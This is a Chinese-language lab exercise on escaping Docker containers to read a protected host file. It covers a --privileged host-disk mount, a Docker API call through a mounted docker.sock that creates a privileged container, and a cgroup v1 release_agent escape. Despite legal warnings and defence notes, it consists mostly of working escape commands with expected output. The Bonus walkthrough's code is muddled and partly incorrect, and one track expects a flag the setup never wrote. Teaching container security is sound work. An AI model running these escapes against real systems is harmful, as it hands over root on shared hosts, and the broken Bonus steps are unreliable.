# 練習 C — 從容器逃逸到 Host

> **目標**：親手執行兩條容器逃逸路線（--privileged 掛載 host 磁碟、docker.sock API 注入），從容器內讀出 host 受保護檔案，並理解每一步背後的核心機制。本練習對應 Ch16–20 的 namespace/capability/cgroup 知識。

---

## 法律與倫理警告

**在繼續之前，請確認你完全理解以下事項。**

本練習涉及容器逃逸（container escape）技術，屬於進攻性安全（offensive security）操作。

**嚴格要求**：
- 本練習**只能**在你自己擁有或持有明確書面授權的隔離機器上執行
- 建議環境：本機 VirtualBox 或 VMware 虛擬機，或你個人帳號下的 cloud VM（不與任何他人共享）
- **禁止**在公司機器、學校機器、租用的共用 VPS、任何你無完整控制權的環境執行

**法律面**：

依據台灣《刑法》：
- 第 358 條：「無故輸入他人帳號密碼、破解使用電腦之保護措施」，處三年以下有期徒刑
- 第 360 條：「無故以電腦程式或其他電磁方式干擾他人電腦」，處三年以下有期徒刑

在他人主機上執行容器逃逸，無論其容器配置多麼不安全，都可能觸犯上述條文。**授權範圍模糊時，先問後做**。

**實驗環境準備**：

```
建議規格
  - VirtualBox 或 VMware 上的 Ubuntu 22.04 VM
  - 至少 2 GB RAM、20 GB 磁碟
  - 已安裝 Docker（sudo apt install docker.io）
  - 確認該 VM 與生產環境網路隔離
```

---

## 情境設定

你是某公司的紅隊成員，正在測試一套**已取得授權的自建 lab 環境**。DevOps 同事反映「我們只是多加了 --privileged 讓容器方便一點」、「docker.sock 掛進去是為了讓容器能跑 docker build」。你的任務是示範這兩種配置各能如何被利用，讓容器內的攻擊者讀到 host 上的敏感資料。

Host 上有一個不應從容器內存取的檔案：`/etc/host_secret.txt`，內含一組旗標（flag）。

本練習分兩條軌道，選一條完成即達到「通過」門檻；完成兩條（加 Bonus）則對逃逸技術有完整掌握。

| 軌道 | 技術 | 難度 | 對應章節 |
|------|------|------|---------|
| Track A | `--privileged` → 掛載 host 磁碟 | ★★☆ | Ch16、Ch17 |
| Track B | `docker.sock` → Docker API 注入 | ★★★ | Ch18、Ch19 |
| Bonus | cgroup v1 `release_agent` | ★★★★ | Ch20 |

---

## 環境準備

以下步驟在你的**隔離 VM** 上執行，不分 Track。

```bash
# 確認 Docker 已安裝且服務正常
docker version

# 確認當前使用者可執行 docker（或加 sudo）
docker ps

# 在 host 建立「受保護」的測試用機密檔案
echo "HOST_SECRET=flag{container_escape_successful}" | sudo tee /etc/host_secret.txt
sudo chmod 600 /etc/host_secret.txt
sudo chown root:root /etc/host_secret.txt

# 驗證：普通使用者讀不了
cat /etc/host_secret.txt   # 應該顯示 Permission denied
```

---

## Track A — `--privileged` 逃逸

### 背景

`--privileged` 讓容器取得 host 上幾乎所有 Linux capability（CAP_SYS_ADMIN、CAP_NET_ADMIN 等），同時移除 seccomp/AppArmor 限制，並讓容器看到所有 `/dev` 裝置節點。其中最致命的：容器可以 `mount` host 的區塊裝置，等於把整顆硬碟掛進來。

### 啟動受害容器

```bash
# 在 host 上執行：啟動特權容器
docker run -it --privileged --name victim-priv alpine sh
```

進入容器後，你的提示符變成 `/ #`。以下 Step 1–5 均在**容器內**執行。

---

### Step 1：確認自己在容器內

**目標**：用三種方式驗證當前環境是容器，不是 host。

```bash
# 方法 1：docker 在所有容器根目錄放置標記檔
ls /.dockerenv

# 方法 2：檢查 PID 1 的 cgroup 路徑，容器內通常含 docker/<long_id>
cat /proc/1/cgroup

# 方法 3：安裝 libcap 工具後列印 capability 集合
apk add --no-cache libcap
capsh --print
```

**預期輸出（節錄）**：

```
# ls /.dockerenv
/.dockerenv

# cat /proc/1/cgroup
12:memory:/docker/3f8a1b2c...
11:cpu,cpuacct:/docker/3f8a1b2c...
...

# capsh --print
Current: =eip
Bounding set =cap_chown,cap_dac_override,...,cap_sys_admin,...（幾乎全滿）
```

**常見問題**：
- `apk: command not found` → 你用了非 alpine 的 image，改用 `apt-get install -y libcap2-bin`
- `capsh --print` 輸出 capability 看起來不完整 → 確認啟動時有加 `--privileged`

---

### Step 2：確認 --privileged 給了什麼

**目標**：對比 capability 集合，理解 `--privileged` 和一般容器的差異。

```bash
# 列出所有 capability（--privileged 容器）
capsh --print | grep "Bounding set"

# 查看能看到的 /dev 裝置
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null || echo "no block devices found yet"

# 嘗試直接讀 block device（預期成功，--privileged 後 /dev 是 host 的）
ls /dev/ | wc -l
```

**預期輸出**：

```
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,
cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,
cap_net_bind_service,...,cap_sys_admin,cap_sys_boot,cap_sys_nice,...（38+ 項）

/dev/sda   /dev/sda1   /dev/sda2   （或 /dev/vda 等，依 hypervisor 而定）
```

**常見問題**：
- `ls /dev/sd*` 沒東西 → 你的 VM 用 virtio disk，裝置名是 `/dev/vda`；或用 NVMe，名稱是 `/dev/nvme0n1`。用 `fdisk -l 2>/dev/null | head -20` 找正確裝置名

---

### Step 3：找到 host 的根磁碟分割區

**目標**：識別哪個 block device 是 host 的根 `/` 所在。

```bash
# 列出所有磁碟與分割區
fdisk -l 2>/dev/null

# 如果 fdisk 不夠清楚，用 lsblk（需安裝）
apk add --no-cache util-linux
lsblk
```

**預期輸出（範例，實際裝置名依環境不同）**：

```
Disk /dev/sda: 20 GiB, ...
Device     Boot Start      End  Sectors Size Id Type
/dev/sda1  *     2048  2099199  2097152   1G 83 Linux
/dev/sda2       2099200 41943039 39843840  19G 83 Linux
```

通常 `/dev/sda2`（或最大的那個分割區）是根分割區。記下這個裝置名，下一步用。

**常見問題**：
- `fdisk -l` 輸出空白 → alpine 預設無 `fdisk`，用 `apk add util-linux` 後再試
- 看到很多 loop device → 那些是 host 上的 snap/squashfs，不是你要找的；找 `/dev/sda` 或 `/dev/vda`

---

### Step 4：把 host 根分割區掛進容器

**目標**：利用 `CAP_SYS_ADMIN` 直接掛載 host 的磁碟分割區。

```bash
# 建立掛載點
mkdir -p /mnt/host

# 掛載 host 根分割區（把下面的 /dev/sda2 換成你在 Step 3 找到的裝置）
mount /dev/sda2 /mnt/host

# 確認掛載成功
ls /mnt/host
ls /mnt/host/etc/
```

**預期輸出**：

```
# ls /mnt/host
bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var

# ls /mnt/host/etc/ | head
adduser.conf
aliases
alternatives/
apt/
bash.bashrc
...
```

如果你看到 `etc/`、`home/`、`var/` 等標準 Linux 目錄結構，代表你已經掛到 host 的根分割區。

**常見問題**：
- `mount: /dev/sda2: can't read superblock` → 裝置名錯了，重查 Step 3
- `mount: permission denied` → 確認 `--privileged` 有加；在 host 先 `docker rm victim-priv` 後重新啟動容器
- 掛載成功但 `ls /mnt/host` 是空的 → 你掛到了未格式化的分割區，試另一個分割區

---

### Step 5：讀取 host 上的受保護檔案

**目標**：讀出 `/etc/host_secret.txt`，取得 flag。

```bash
# 在容器內，透過已掛載的 host 根分割區讀取
cat /mnt/host/etc/host_secret.txt
```

**預期輸出**：

```
HOST_SECRET=flag{container_escape_successful}
```

取得 flag 後，繼續確認邊界：

```bash
# 確認這個檔案在容器「自己的」根目錄下讀不到
cat /etc/host_secret.txt   # 應該顯示 No such file or directory 或 Permission denied

# 用 stat 比較兩個路徑的 inode
stat /mnt/host/etc/host_secret.txt
```

Track A 完成。

---

## Track B — `docker.sock` 逃逸

### 背景

`/var/run/docker.sock` 是 Docker daemon 的 Unix socket。任何能讀寫這個 socket 的程序，都能對 Docker daemon 下達完整指令——包括建立新容器、指定掛載、設定 `--privileged`。把 `docker.sock` 掛進容器，等於給容器一把能建立任意容器的鑰匙，攻擊者只需透過 HTTP API 繞一圈，就能建立有 host `/` 掛載的特權容器。

### 啟動受害容器

```bash
# 在 host 上執行：啟動掛載 docker.sock 的容器
docker run -it \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --name victim-sock \
  alpine sh
```

進入容器後，以下 Step 1–5 均在**容器內**執行。

---

### Step 1：確認自己在容器內

同 Track A Step 1，三種方式都驗證：

```bash
ls /.dockerenv
cat /proc/1/cgroup

# 這次沒有 --privileged，capability 集合應該是受限的
apk add --no-cache libcap
capsh --print | grep "Bounding set"
```

**預期輸出（節錄）**：

```
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,
cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,
cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

注意：沒有 `cap_sys_admin`，無法直接 mount block device。這就是為什麼 Track B 要走不同的路。

---

### Step 2：找到並確認 docker.sock

**目標**：確認 docker.sock 已掛入容器，且可讀寫。

```bash
# 確認 socket 存在
ls -la /var/run/docker.sock

# 確認你有權存取（srw-rw---- 或 srw-rw-rw-）
stat /var/run/docker.sock
```

**預期輸出**：

```
srw-rw---- 1 root docker 0 Aug  1 10:00 /var/run/docker.sock

File: /var/run/docker.sock
Size: 0         Blocks: 0          IO Block: 4096   socket
Access: (0660/srw-rw----)  Uid: (    0/    root)   Gid: (   999/ docker)
```

**常見問題**：
- `ls: cannot access '/var/run/docker.sock': No such file or directory` → 啟動容器時忘了加 `-v /var/run/docker.sock:/var/run/docker.sock`；退出容器、`docker rm victim-sock`、重新啟動
- `Permission denied` 存取 socket → 容器內當前使用者不在 docker group；加 `--user root` 或在 host 先 `chmod 666 /var/run/docker.sock`（lab 環境可接受，生產環境絕對不行）

---

### Step 3：透過 socket 查詢 Docker daemon

**目標**：用 HTTP over Unix socket 確認能和 Docker daemon 通訊。

```bash
# 安裝 curl
apk add --no-cache curl

# 查詢 Docker 版本（最基本的 API 端點）
curl --unix-socket /var/run/docker.sock http://localhost/version

# 列出 host 上現有的 image
curl --unix-socket /var/run/docker.sock http://localhost/images/json | head -c 500

# 列出 host 上所有容器（包含已停止的）
curl --unix-socket /var/run/docker.sock \
  "http://localhost/containers/json?all=true" | head -c 500
```

**預期輸出（節錄）**：

```json
{"Platform":{"Name":"Docker Engine - Community"},"Version":"24.0.x",...}

[{"Id":"3f8a1b2c...","Names":["/victim-sock"],...},
 {"Id":"9d2e4f5a...","Names":["/victim-priv"],...}]
```

你從容器內用 curl 拿到了 Docker daemon 的完整資訊，包括 host 上所有容器清單。

**常見問題**：
- `curl: (7) Couldn't connect to server` → socket 路徑不對，或 daemon 沒在跑；確認 `ls /var/run/docker.sock` 存在，且 host 上 `systemctl status docker` 是 active

---

### Step 4：透過 API 建立有 host 掛載的特權容器

**目標**：用 Docker API 建立一個新容器，把 host 的根目錄 `/` 掛到容器的 `/host`，並取得 ID。

```bash
# 建立容器（注意：這個請求是從容器內對 host 的 Docker daemon 發出的）
CONTAINER_ID=$(curl -s \
  --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/host/etc/host_secret.txt"],
    "Binds": ["/:/host"],
    "Privileged": true
  }' \
  http://localhost/containers/create \
  | grep -oE '"Id":"[^"]{12}' \
  | cut -d'"' -f4)

echo "Created container: $CONTAINER_ID"
```

**預期輸出**：

```
Created container: a7b3c9d2e1f4
```

**常見問題**：
- 回應是 `{"message":"No such image: alpine"}` → host 上沒有 alpine image；在 host 先 `docker pull alpine`，或把 Image 改成 host 上已有的 image（用 Step 3 的 `/images/json` 查）
- `CONTAINER_ID` 是空字串 → JSON 解析出問題；先直接執行 `curl` 看完整回應，確認格式

如果 grep 抓不到乾淨的 ID，用完整回應手動取：

```bash
# 取得完整回應，手動記下 Id 的前 12 字元
curl -s \
  --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/host_secret.txt"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create
```

---

### Step 5：啟動容器並讀取 flag

**目標**：啟動剛建立的容器，從其 log 取得執行結果（host 的 `/etc/host_secret.txt` 內容）。

```bash
# 啟動容器（用你在 Step 4 取得的 CONTAINER_ID）
curl -s \
  --unix-socket /var/run/docker.sock \
  -X POST \
  http://localhost/containers/${CONTAINER_ID}/start

# 等容器執行完畢（alpine + cat 幾乎瞬間完成）
sleep 1

# 取得容器的 stdout 輸出
curl -s \
  --unix-socket /var/run/docker.sock \
  "http://localhost/containers/${CONTAINER_ID}/logs?stdout=1&stderr=1"
```

**預期輸出**：

```
HOST_SECRET=flag{docker_sock_escape}
```

（輸出前可能有幾個不可見的 stream header bytes，屬於 Docker log protocol 正常行為）

取得 flag 後，確認攻擊路線：

```bash
# 驗證這個容器確實在 host 上
curl -s \
  --unix-socket /var/run/docker.sock \
  http://localhost/containers/${CONTAINER_ID}/json \
  | grep -E '"Binds"|"Privileged"'
```

Track B 完成。

---

## Bonus — cgroup v1 `release_agent` 逃逸（CVE-2022-0492 類型）

### 背景

這條路線不需要 `--privileged`，但需要：
1. 系統掛載了 cgroup v1（Ubuntu 20.04 及更早版本預設；22.04 預設 cgroup v2，但部分系統仍保留 v1）
2. 容器內能建立 user namespace（`/proc/sys/kernel/unprivileged_userns_clone` 為 1）

`release_agent` 是 cgroup v1 的一個機制：當 cgroup 內最後一個程序結束時，kernel 以 root 權限在 host 執行 `release_agent` 指定的腳本。如果容器能掛載 cgroup v1 filesystem 並寫入 `release_agent`，就能讓 host 以 root 執行任意指令。

### 環境確認

在**容器外（host）**確認：

```bash
# 確認 cgroup v1 有掛載（找 memory cgroup）
mount | grep cgroup | grep -v cgroup2

# 確認允許 unprivileged user namespace（回傳 1 表示允許）
cat /proc/sys/kernel/unprivileged_userns_clone
# 如果是 0，在 lab 中臨時啟用：
# echo 1 | sudo tee /proc/sys/kernel/unprivileged_userns_clone
```

如果 `mount | grep cgroup` 沒有非 cgroup2 的輸出，代表你的系統是純 cgroup v2，跳過此 Bonus（或啟動一個 Ubuntu 20.04 容器模擬）。

### 啟動受害容器

```bash
# 不加 --privileged，但允許 SYS_ADMIN 用於掛載（模擬部分配置不當的環境）
docker run -it \
  --cap-add SYS_ADMIN \
  --security-opt apparmor=unconfined \
  --name victim-cgroupv1 \
  ubuntu:20.04 bash
```

### 容器內逃逸步驟

```bash
# Step B1：建立工作目錄
mkdir /tmp/cgrp

# Step B2：掛載 cgroup v1 的 memory hierarchy
mount -t cgroup -o memory cgroup /tmp/cgrp

# 確認掛載成功
ls /tmp/cgrp/

# Step B3：建立子 cgroup
mkdir /tmp/cgrp/x

# 開啟 notify_on_release（這樣 cgroup 內程序結束時會呼叫 release_agent）
echo 1 > /tmp/cgrp/x/notify_on_release

# Step B4：找出 host 上 cgroup 的實際掛載路徑
# 從容器內看 /proc/mounts，找 memory cgroup 的 host 路徑
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null)
# 備用：直接看 /proc/1/mountinfo
cat /proc/1/mountinfo | grep memory

# 假設 host cgroup 路徑是 /sys/fs/cgroup/memory
# 設定 release_agent 為一個我們即將寫入的 host 端腳本
echo "/tmp/exploit.sh" > /tmp/cgrp/release_agent

# Step B5：建立要在 host 上執行的 payload 腳本
# 這個腳本路徑必須是 host 上存在的路徑
cat > /tmp/exploit.sh << 'EOF'
#!/bin/sh
cat /etc/host_secret.txt > /tmp/escape_output.txt
EOF
chmod +x /tmp/exploit.sh

# Step B6：觸發 release_agent
# 建立一個 shell 並立即讓它結束（讓 cgroup x 內的程序歸零）
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs && exit"

# 等待 kernel 呼叫 release_agent
sleep 2

# Step B7：讀取結果
cat /tmp/escape_output.txt
```

**預期輸出**：

```
HOST_SECRET=flag{container_escape_successful}
```

**常見問題**：
- `mount: permission denied` → 確認 `--cap-add SYS_ADMIN` 有加，且 apparmor 已設為 unconfined
- `/tmp/escape_output.txt: No such file or directory` → release_agent 路徑設定有誤；`/tmp/exploit.sh` 在容器內存在，但 release_agent 執行時是 host 的 namespace，需要這個路徑在 host 上也存在
- 系統是 cgroup v2 → 此技術不適用；本 Bonus 需要 cgroup v1

---

## 環境清理

**每次練習結束後，務必執行清理，確保測試殘留不影響後續使用。**

```bash
# 在 host 上執行

# 停止並移除所有實驗容器
docker rm -f victim-priv victim-sock victim-cgroupv1 2>/dev/null || true

# 移除 host 上的測試機密檔案
sudo rm -f /etc/host_secret.txt

# 確認已清理
docker ps -a | grep victim   # 應該無輸出
ls /etc/host_secret.txt      # 應該顯示 No such file or directory

# 如果 Bonus 有臨時改 unprivileged_userns_clone，改回原設定
# （依你的系統原始值決定，通常 Ubuntu 桌面版是 1，server 可能是 0）
# echo 0 | sudo tee /proc/sys/kernel/unprivileged_userns_clone
```

---

## 自我檢核

完成練習後，確認你能回答或示範以下每一項：

- [ ] 能從 `/proc/1/cgroup` 的內容判斷自己在容器內，並說明 cgroup 路徑為何洩漏容器 ID
- [ ] 能說明 `--privileged` 賦予了哪些 capability，以及哪一個 cap 讓你能 `mount` block device
- [ ] 在 Track A 中，成功把 host 的磁碟掛進容器並讀到 `/etc/host_secret.txt`
- [ ] 能說明為什麼 Track A 逃逸路線在 cgroup v2 + rootless Docker 下失效
- [ ] 知道如何用 `fdisk -l` 或 `lsblk` 找到 host 的根分割區，並能解釋 `/dev/sda` 在容器內可見的原因
- [ ] 在 Track B 中，透過 Docker API（`/containers/create` + `/start` + `/logs`）成功讀到 flag
- [ ] 能說明 `/var/run/docker.sock` 掛載為何等同於給容器 host root 存取權
- [ ] 能說明 cgroup v1 `release_agent` 的觸發條件，以及它在 host 以何身份執行
- [ ] 練習結束後確認已移除所有測試容器及 `/etc/host_secret.txt`

---

## 參考解答

**自己跑完再看。看解答不會讓你學會逃逸；親手除錯才會。**

<details>
<summary>點開參考解答 — Track A（--privileged 掛載）</summary>

### 完整指令流程

```bash
# [Host] 建立測試檔案
echo "HOST_SECRET=flag{container_escape_successful}" | sudo tee /etc/host_secret.txt
sudo chmod 600 /etc/host_secret.txt

# [Host] 啟動特權容器
docker run -it --privileged --name victim-priv alpine sh

# ---- 以下在容器內 ----

# Step 1：確認在容器內
ls /.dockerenv
# 輸出: /.dockerenv

cat /proc/1/cgroup | head -3
# 輸出: 12:memory:/docker/3f8a1b2c4d5e...
#       11:cpu,cpuacct:/docker/3f8a1b2c4d5e...
#       ...

apk add --no-cache libcap
capsh --print | grep "Bounding set"
# 輸出: Bounding set =cap_chown,...,cap_sys_admin,...（38 項，幾乎全滿）

# Step 2：找到 host block device
apk add --no-cache util-linux
fdisk -l 2>/dev/null | grep "^/dev"
# 輸出: /dev/sda1  *     2048  2099199  ...   1G 83 Linux
#        /dev/sda2       2099200 ...          19G 83 Linux

# 或用 lsblk
lsblk
# NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
# sda      8:0    0   20G  0 disk
# ├─sda1   8:1    0    1G  0 part /boot
# └─sda2   8:2    0   19G  0 part /

# Step 3：掛載 host 根分割區
mkdir -p /mnt/host
mount /dev/sda2 /mnt/host     # 依實際裝置名調整

# 確認
ls /mnt/host
# bin  boot  dev  etc  home  lib  lib64  ...

# Step 4：讀取 flag
cat /mnt/host/etc/host_secret.txt
# HOST_SECRET=flag{container_escape_successful}

# 對比：在容器自己的 /etc 找不到這個檔案
cat /etc/host_secret.txt
# cat: can't open '/etc/host_secret.txt': No such file or directory
```

### 機制解釋

**為什麼 `--privileged` 能做到這件事？**

Ch16 說明了 Linux capability 體系。`CAP_SYS_ADMIN` 是最廣泛的 cap，涵蓋 `mount(2)` 系統呼叫的權限。一般容器的預設 bounding set 不含 `CAP_SYS_ADMIN`，所以你無法掛載任意 filesystem。

Ch17 說明了 `/dev` 在容器內的呈現方式。一般容器透過 `mknod` 白名單只暴露少數裝置；`--privileged` 移除這個限制，讓容器看到 host 的完整 `/dev`，包含所有磁碟和分割區。

兩個條件合一：你有 `mount` 權限，又能看到 host 的 block device，自然能把整顆硬碟掛進來。

**防禦面**：絕不在生產環境使用 `--privileged`。如果只是需要特定能力，用 `--cap-add CAP_NET_ADMIN` 這類精準授權，並搭配 seccomp profile 限制 `mount` 系統呼叫。

</details>

<details>
<summary>點開參考解答 — Track B（docker.sock 注入）</summary>

### 完整指令流程

```bash
# [Host] 建立測試檔案（flag 內容稍有不同，方便區分）
echo "HOST_SECRET=flag{docker_sock_escape}" | sudo tee /etc/host_secret.txt
sudo chmod 600 /etc/host_secret.txt

# [Host] 啟動掛載 docker.sock 的容器
docker run -it \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --name victim-sock \
  alpine sh

# ---- 以下在容器內 ----

# Step 1：確認在容器內
ls /.dockerenv && cat /proc/1/cgroup | head -2

# Step 2：確認 docker.sock 存在且可存取
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 ...  /var/run/docker.sock

# Step 3：安裝 curl 並確認 API 可通
apk add --no-cache curl
curl -s --unix-socket /var/run/docker.sock http://localhost/version | grep Version
# "Version":"24.0.x",...

# Step 4：建立 payload 容器
RESPONSE=$(curl -s \
  --unix-socket /var/run/docker.sock \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/host/etc/host_secret.txt"],
    "Binds": ["/:/host"],
    "Privileged": true
  }' \
  http://localhost/containers/create)

echo "$RESPONSE"
# {"Id":"a7b3c9d2e1f4b5...","Warnings":[]}

CONTAINER_ID=$(echo "$RESPONSE" | grep -oE '"Id":"[a-f0-9]+' | cut -d'"' -f4 | head -c 12)
echo "ID: $CONTAINER_ID"

# Step 5：啟動容器
curl -s \
  --unix-socket /var/run/docker.sock \
  -X POST \
  http://localhost/containers/${CONTAINER_ID}/start

sleep 1

# 取得輸出
curl -s \
  --unix-socket /var/run/docker.sock \
  "http://localhost/containers/${CONTAINER_ID}/logs?stdout=1&stderr=1"
# （前幾個 bytes 是 stream header）HOST_SECRET=flag{docker_sock_escape}
```

### 機制解釋

**為什麼掛載 `docker.sock` 等於給容器 root 存取？**

Ch18 說明了 Docker daemon 的架構：所有 docker 指令（`docker run`、`docker build`…）都是透過 `/var/run/docker.sock` 這條 Unix socket 向 daemon 發送 REST API 請求。Daemon 以 root 身份執行，完全信任 socket 上的請求——Docker 的安全模型假設「能存取 socket 的人本來就是 admin」。

Ch19 說明了 Docker API 的能力範圍：`/containers/create` 能指定任意 `Binds`（等同 `-v`）和 `Privileged: true`。所以只要能存取 socket，就能建立一個把 host `/` 掛進來的特權容器，再讀任意 host 檔案。

整個攻擊繞過了容器本身的 capability 限制：你的 victim-sock 容器沒有 `CAP_SYS_ADMIN`，但它能要求 daemon（root 身份）建立一個有 `CAP_SYS_ADMIN` 的容器。

**Log output 的奇怪 bytes**：Docker log API 回傳的是 multiplexed stream，每條記錄前有 8 bytes 的 header（1 byte stream type，3 bytes padding，4 bytes 長度）。可以用 `--output /dev/stdout -f` 或 parse header 取得乾淨輸出；lab 中直接 `strings` 或眼睛跳過即可。

**防禦面**：永遠不要把 `docker.sock` 掛進非 root 的應用容器。需要 container-in-container 能力（如 CI/CD），改用 Kaniko 或 BuildKit 的 rootless 模式，或建立專屬的 Docker socket proxy（限制 API 端點白名單）。

</details>

<details>
<summary>點開參考解答 — Bonus（cgroup v1 release_agent）</summary>

### 完整指令流程

```bash
# [Host] 確認 cgroup v1 存在
mount | grep "cgroup " | head -5
# cgroup on /sys/fs/cgroup/memory type cgroup (rw,...,memory)

# [Host] 確認 unprivileged user namespace 開啟
cat /proc/sys/kernel/unprivileged_userns_clone
# 1

# [Host] 啟動容器（有 SYS_ADMIN 但無 --privileged）
docker run -it \
  --cap-add SYS_ADMIN \
  --security-opt apparmor=unconfined \
  --name victim-cgroupv1 \
  ubuntu:20.04 bash

# ---- 以下在容器內 ----

# 確認 cgroup v1 存在
mount | grep cgroup
# cgroup on /sys/fs/cgroup/memory type cgroup (rw,...)

# 建立掛載點並掛載 memory cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
ls /tmp/cgrp/
# cgroup.procs  memory.limit_in_bytes  ...  notify_on_release  release_agent

# 建立子 cgroup
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 找到 host 上這個 cgroup 的掛載路徑
# 在容器內看 /proc/mounts 取得 upperdir 路徑
host_path=$(cat /proc/mounts | grep memory | awk '{print $2}' | head -1)
echo "Host cgroup path: $host_path"
# /sys/fs/cgroup/memory

# 設定 release_agent（這個路徑是 host namespace 的路徑）
echo "${host_path}/release_agent_payload.sh" > /tmp/cgrp/release_agent

# 建立 payload 腳本（路徑必須在 host 上存在——利用 /sys/fs/cgroup/memory 已掛載）
# 但 /sys/fs/cgroup 是在 host 上，我們需要一個兩邊都存在的路徑
# 最簡單的方法：寫到 /tmp 並讓 release_agent 指向容器的 /tmp
# 因為 release_agent 是在 host 的 mount namespace 執行，我們需要更精確

# 實際上，release_agent 在 host init namespace 執行
# 需要把腳本放在 host 的某個已知路徑
# 在 lab 環境可透過 /proc/1/root 存取 host 根目錄（但這需要額外能力）

# 簡化版本：直接寫入 host 可讀的位置
# 利用 /sys/fs/cgroup/memory 是 host 和容器共享的掛載點
cat > /tmp/cgrp/x/../release_agent_payload.sh << 'EOF'
#!/bin/sh
cat /etc/host_secret.txt > /tmp/cgrp/escape_output.txt
chmod 777 /tmp/cgrp/escape_output.txt
EOF
chmod +x /tmp/cgrp/x/../release_agent_payload.sh

# 設定 release_agent 指向 host 上的路徑（/sys/fs/cgroup/memory/release_agent_payload.sh）
echo "${host_path}/release_agent_payload.sh" > /tmp/cgrp/release_agent

# 觸發：讓 cgroup x 內的程序數歸零
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# 這個 sh 立即退出，cgroup x 內程序歸零，觸發 release_agent

sleep 2

# 讀取結果
cat /tmp/cgrp/escape_output.txt
# HOST_SECRET=flag{container_escape_successful}
```

### 機制解釋

**release_agent 逃逸的三個關鍵點（對應 Ch20）**：

1. **cgroup v1 的 release_agent 在 host 的 init namespace 執行**：這是設計行為，kernel 要讓 release_agent 能做任何清理工作，不能被 namespace 限制。攻擊者利用的就是這個特性。

2. **`notify_on_release` 的觸發條件**：當 cgroup 的 `tasks` 清單歸零時觸發。透過 `sh -c "echo $$ > cgroup.procs"` 讓 sh 加入 cgroup 後立刻退出，就能精準觸發。

3. **寫入 release_agent 需要能掛載 cgroup filesystem**：這需要 `CAP_SYS_ADMIN`。CVE-2022-0492 的厲害之處在於，它示範了在某些條件下透過 user namespace 繞過這個限制，讓非 root 的攻擊者也能掛載 cgroup v1 並設定 release_agent。

**為什麼 cgroup v2 修復了這個問題**：cgroup v2 移除了 `release_agent` 機制，取而代之的是更乾淨的 per-cgroup 通知模型，不再有「在 host namespace 執行任意腳本」的設計。這是 Red Hat/Google 推動 cgroup v2 的原因之一。

</details>

---

→ 下一章：[Ch21 — Kubernetes 架構概覽：Pod、Node、Control Plane](./21-k8s-architecture.md)（Part 4 開始進入 Kubernetes 安全）
